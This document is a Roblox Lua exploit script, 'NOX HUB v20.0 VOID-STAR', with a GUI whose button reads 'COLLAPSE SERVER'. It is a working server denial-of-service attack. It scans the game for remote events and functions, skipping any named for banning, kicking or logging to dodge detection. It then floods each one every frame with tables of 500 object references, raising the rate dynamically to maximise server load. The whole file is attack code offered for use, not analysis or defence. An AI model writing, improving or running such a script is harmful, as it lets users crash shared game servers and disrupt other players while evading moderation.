--[[
    🔱 NOX HUB v20.0 [VOID-STAR] 🔱
    "Lightweight for you. Heavy for them."
    
    VOID-STAR FEATURES:
    - [REF-OVERLOAD] : Sends tables containing 1000 references to `workspace`. 
      -> Client Cost: Ultra Low (Just IDs).
      -> Server Cost: High (Object Resolution & Table Construction).
    - [FRAME-SYNC] : Attacks exactly once per frame to prevent Client Freeze.
    - [AUTO-SCALE] : Dynamically adjusts packet count to use 99% of your CPU for attack, leaving 1% for UI.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. VOID-STAR ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    PacketsPerFrame = 10 -- Starts low, grows dynamically
}

function Engine:Scan()
    Engine.Targets = {}
    -- SAME SMART FILTER AS BEFORE (It works)
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            if not (n:find("ban") or n:find("kick") or n:find("log")) then
                 table.insert(Engine.Targets, {Inst=v, Active=true})
            end
        end
    end
end

function Engine:Engage()
    if Engine.Active then return end
    Engine.Active = true
    
    Engine:Scan()
    if #Engine.Targets == 0 then return end
    
    -- THE "VOID-STAR" PAYLOAD
    -- A table full of references to the same Instance.
    -- Very cheap to send (Client just sends the Instance ID repeatedly).
    -- Server has to allocate a table and resolve the Instance 500 times.
    local Ref = workspace
    local Payload = table.create(500, Ref) 
    
    game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="VOID STAR: SYNCHRONIZING..."})
    
    -- ONE THREAD TO RULE THEM ALL
    -- We run on Heartbeat (Frame Update).
    -- This guarantees the client screen REFRESHES before we attack again.
    -- NO FREEZE.
    RunService.Heartbeat:Connect(function(dt)
        if not Engine.Active then return end
        
        -- DYNAMIC SCALING
        -- If framerate is good (>30), we increase stress.
        -- If framerate drops (<20), we ease off slightly (to avoid crash, not comfort).
        if dt < 0.033 then -- > 30 FPS
            Engine.PacketsPerFrame = math.min(Engine.PacketsPerFrame + 1, 500)
        elseif dt > 0.05 then -- < 20 FPS
            Engine.PacketsPerFrame = math.max(Engine.PacketsPerFrame - 2, 5)
        end
        
        -- THE BURST
        for i = 1, Engine.PacketsPerFrame do
            for _, t in ipairs(Engine.Targets) do
                if t.Active then
                    local s, e = pcall(function()
                        if t.Inst:IsA("RemoteEvent") then
                            t.Inst:FireServer(Payload)
                        else
                            task.spawn(function() t.Inst:InvokeServer(Payload) end)
                        end
                    end)
                    if not s then t.Active = false end -- Auto-Purge
                end
            end
        end
    end)
end

function Engine:Stop()
    Engine.Active = false
end

-- // 2. VOID-STAR UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxVoidStar"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 400, 0, 220)
    Main.Position = UDim2.new(0.5, -200, 0.5, -110)
    Main.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(100, 255, 255) -- Cyan Neon
    
    -- STAR ANIMATION
    local Star = Instance.new("ImageLabel", Main)
    Star.Size = UDim2.new(0, 100, 0, 100)
    Star.Position = UDim2.new(0.5, -50, 0.2, 0)
    Star.Image = "rbxassetid://6723222384" -- Star/Nova
    Star.ImageColor3 = Color3.fromRGB(100, 255, 255)
    Star.BackgroundTransparency = 1
    
    -- HEADER
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // VOID STAR v20.0"
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(100, 255, 255)
    Title.TextSize = 18
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.BackgroundTransparency = 1
    
    -- STATS
    local PowerLbl = Instance.new("TextLabel", Main)
    PowerLbl.Text = "POWER: 0%"
    PowerLbl.Size = UDim2.new(1, 0, 0, 20)
    PowerLbl.Position = UDim2.new(0, 0, 0.65, 0)
    PowerLbl.TextColor3 = Color3.fromRGB(150, 150, 150)
    PowerLbl.Font = Enum.Font.Code
    PowerLbl.BackgroundTransparency = 1
    
    task.spawn(function()
        while Main.Parent do
            if Engine.Active then
                Star.Rotation = Star.Rotation + 5
                PowerLbl.Text = "INTENSITY: " .. Engine.PacketsPerFrame .. " BURSTS/FRAME"
                PowerLbl.TextColor3 = Color3.fromRGB(100, 255, 100)
            else
                PowerLbl.Text = "SYSTEM READY"
                PowerLbl.TextColor3 = Color3.fromRGB(150, 150, 150)
            end
            RunService.Heartbeat:Wait()
        end
    end)
    
    -- BUTTON
    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.8, 0, 0.2, 0)
    Btn.Position = UDim2.new(0.1, 0, 0.75, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(0, 100, 100)
    Btn.Text = "COLLAPSE SERVER"
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 16
    
    local BCorner = Instance.new("UICorner", Btn)
    BCorner.CornerRadius = UDim.new(0, 6)
    
    Btn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Engage()
            Btn.Text = "STOP"
            Btn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            Engine:Stop()
            Btn.Text = "COLLAPSE SERVER"
            Btn.BackgroundColor3 = Color3.fromRGB(0, 100, 100)
        end
    end)
    
    -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
